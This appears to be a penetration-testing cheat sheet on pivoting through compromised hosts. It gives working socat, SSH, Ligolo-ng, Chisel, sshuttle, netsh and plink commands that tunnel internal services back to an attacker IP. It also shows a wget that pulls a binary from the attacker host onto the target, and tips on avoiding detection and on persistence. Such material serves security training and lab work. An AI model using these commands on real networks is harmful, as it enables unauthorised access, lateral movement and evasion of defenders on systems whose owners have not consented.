## Forward all traffic from port 80 to remote host using socat

```bash
socat TCP4-LISTEN:80,fork TCP:$IP:80
```

## Forward all traffic from port 443 to remote host using socat

```bash
socat TCP4-LISTEN:443,fork TCP:$IP:443
```

## Forward all traffic from port 3389 to remote host using socat

```bash
socat TCP4-LISTEN:3389,fork TCP:$IP:3389
```

## Create SSH local port forward

```bash
ssh -L 8080:$IP:80 user@pivot_host
```

## Create SSH remote port forward

```bash
ssh -R 8080:localhost:80 user@10.10.14.5
```

## Create SSH dynamic SOCKS proxy

```bash
ssh -D 9050 user@$IP
```

## Use proxychains with SOCKS proxy

```bash
proxychains nmap -sT -Pn $IP
```

## Configure proxychains for SOCKS5

```bash
echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
```

## Start Ligolo-ng proxy on attacker

```bash
./proxy -selfcert
```

## Connect Ligolo-ng agent from compromised host

```bash
./agent -connect 10.10.14.5:11601 -ignore-cert
```

## Start Ligolo-ng tunnel in proxy session

```bash
session
start
```

## Add route for Ligolo-ng tunnel

```bash
ip route add 192.168.1.0/24 dev ligolo
```

## List Ligolo-ng sessions

```bash
session
```

## Stop Ligolo-ng tunnel

```bash
stop
```

## Create Chisel server on attacker

```bash
./chisel server -p 8080 --reverse
```

## Create Chisel client reverse SOCKS proxy

```bash
./chisel client 10.10.14.5:8080 R:socks
```

## Create Chisel client local port forward

```bash
./chisel client 10.10.14.5:8080 L:8081:localhost:80
```

## Create Chisel client remote port forward

```bash
./chisel client 10.10.14.5:8080 R:8082:localhost:3389
```

## Start sshuttle VPN tunnel

```bash
sshuttle -r user@$IP 192.168.1.0/24
```

## Start sshuttle with DNS forwarding

```bash
sshuttle -r user@$IP 192.168.1.0/24 --dns
```

## Create netsh Windows port forward

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=$IP
```

## List Windows netsh port forwards

```cmd
netsh interface portproxy show all
```

## Delete Windows netsh port forward

```cmd
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

## Create plink reverse SSH tunnel on Windows

```cmd
plink.exe -l user -pw password -R 8080:127.0.0.1:80 10.10.14.5
```

## Create plink dynamic SOCKS proxy on Windows

```cmd
plink.exe -l user -pw password -D 9050 10.10.14.5
```

## Upload socat to target for port forwarding

```bash
wget http://10.10.14.5/socat -O /tmp/socat
chmod +x /tmp/socat
```

## Forward traffic from Windows using socat

```bash
socat TCP4-LISTEN:8080,fork TCP:$IP:80
```

## Create reverse SSH tunnel from Linux

```bash
ssh -R 8080:localhost:80 user@10.10.14.5
```

## Create reverse SSH tunnel from Linux in background

```bash
ssh -f -N -R 8080:localhost:80 user@10.10.14.5
```

## Use SSH ProxyJump for multi-hop connection

```bash
ssh -J user@$IP user@$IP
```

## Create SSH tunnel through multiple hops

```bash
ssh -L 8080:$IP:80 -J user@$IP user@pivot_host
```

## Forward RDP through SSH tunnel

```bash
ssh -L 3389:$IP:3389 user@$IP
```

## Access tunneled RDP service

```bash
rdesktop localhost:3389
```

## Forward SMB through SSH tunnel

```bash
ssh -L 445:$IP:445 user@$IP
```

## Forward MySQL through SSH tunnel

```bash
ssh -L 3306:$IP:3306 user@$IP
```

## Use SSH config file for persistent tunnels

```bash
cat >> ~/.ssh/config << EOF
Host pivot
  HostName $IP
  User user
  LocalForward 8080 $IP:80
  DynamicForward 9050
EOF
```

## Connect using SSH config

```bash
ssh pivot
```

## Create double pivot with SSH

```bash
ssh -L 9050:localhost:9050 user@$IP
ssh -D 9050 user@$IP
```

## Test tunnel connectivity

```bash
curl http://localhost:8080
```

## Verify SOCKS proxy is working

```bash
curl --socks5 127.0.0.1:9050 http://$IP
```

## Scan through SOCKS proxy with nmap

```bash
proxychains nmap -sT -Pn -p 80,443,445 $IP
```

## Use metasploit through SOCKS proxy

```bash
proxychains msfconsole
```

## Configure proxychains for Chisel SOCKS

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
```

## Kill SSH tunnel by process

```bash
ps aux | grep "ssh -"
kill -9 PID
```

## List active SSH tunnels

```bash
ps aux | grep ssh | grep -E "(L|R|D)"
```

---

## Port Forwarding and Tunneling Concepts

Port forwarding and tunneling enable access to services on internal networks that are not directly reachable from the attacker machine. This is essential for pivoting through compromised hosts to reach additional targets.

## Tunnel Types

### Local Port Forward
Forwards a local port on the attacker machine to a remote service through the compromised host. Traffic flows from attacker to pivot to target. Use when you need to access an internal service as if it were local.

### Remote Port Forward
Forwards a port on the remote pivot host back to the attacker machine. Traffic flows from pivot to attacker. Use when the pivot can reach the attacker but not vice versa, or when you need to expose a service running on your attacker machine to the internal network.

### Dynamic Port Forward (SOCKS)
Creates a SOCKS proxy on the attacker machine that routes all traffic through the pivot host. More flexible than static port forwards, allows accessing multiple internal services without creating individual tunnels. Compatible with proxychains and many tools.

## Tool Selection Guide

### Socat
- Simple and lightweight
- Available on most Linux systems
- Good for basic TCP forwarding
- Single port forwarding per instance
- No encryption built-in

### SSH Tunneling
- Encrypted by default
- Very reliable and stable
- Requires SSH access and credentials
- Native on Linux, requires plink on Windows
- Supports all tunnel types

### Ligolo-ng
- Modern tunneling framework
- Easy to use and configure
- Requires agent upload to target
- Great for complex network pivoting
- Supports multiple sessions

### Chisel
- HTTP-based tunneling
- Works well through firewalls
- Single binary for client and server
- Supports SOCKS and port forwarding
- Good for restricted environments

### Netsh (Windows)
- Native Windows tool
- No upload required
- Persistent across reboots
- Requires administrator privileges
- Limited to port forwarding only

## Common Tunneling Scenarios

### Accessing Internal Web Application
Create local port forward to reach web server on $IP:80 through compromised host at $IP, then browse to localhost:8080 on attacker machine.

### RDP to Internal Windows Host
Forward local port 3389 to internal Windows machine, then use RDP client to connect to localhost on attacker machine.

### Scanning Internal Network
Create dynamic SOCKS proxy through compromised host, configure proxychains, then run nmap and other tools through the proxy to scan internal network.

### Multi-Hop Pivoting
Create tunnel through first compromised host, then create second tunnel through that to reach deeper network segments.

### Reverse Tunneling
When compromised host cannot be reached directly but can connect outbound, use reverse port forwarding to expose internal services back to attacker machine.

## Tunneling Best Practices

1. Always verify tunnel is working with simple connectivity test
2. Use encrypted tunnels when possible to avoid detection
3. Clean up tunnels when no longer needed
4. Document all tunnel configurations for reporting
5. Test multiple tunnel types if first method fails
6. Consider network topology when choosing tunnel type
7. Use SOCKS proxy for flexibility with multiple internal targets

## Troubleshooting Tunnels

### Tunnel Not Working
Verify both ends are running, check firewall rules, test with telnet or nc, verify correct IP addresses and ports

### Connection Drops
Use autossh or persistent connection options, check for idle timeout settings, monitor for network instability

### Performance Issues
Reduce number of hops, use compression if available, check for bandwidth limitations, consider using UDP-based tunnels

### Tool Compatibility
Some tools don't work well with SOCKS proxies, use proxychains for compatibility, try different SOCKS versions (4/5), consider direct port forwarding instead

## Integration with Exploitation

Once tunnel is established:
1. Enumerate internal network services
2. Identify additional targets
3. Transfer tools through tunnel
4. Exploit internal vulnerabilities
5. Establish persistence on internal hosts
6. Document internal network topology
